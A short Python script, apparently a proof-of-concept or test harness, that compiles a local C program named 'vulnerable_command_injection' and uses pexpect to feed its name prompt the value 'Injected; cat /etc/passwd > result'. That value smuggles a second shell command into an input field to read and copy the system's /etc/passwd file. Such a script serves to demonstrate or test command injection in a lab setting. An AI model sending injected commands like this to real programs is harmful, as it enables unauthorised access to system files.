import pexpect

# Compile the target file first
compile_command = "gcc -o vulnerable_command_injection vulnerable_command_injection.c"
compile_process = pexpect.spawn(compile_command)
compile_process.expect(pexpect.EOF)

# Start the target program
process = pexpect.spawn('./vulnerable_command_injection')

# Wait for the prompt
process.expect("Enter your name:")

# Send input to exploit the command injection vulnerability
malicious_input = "Injected; cat /etc/passwd > result"
process.sendline(malicious_input)

# Wait for the program to handle the input
process.expect(pexpect.EOF)

# Read and print the output
output = process.before.decode()
print("Program output:", output)
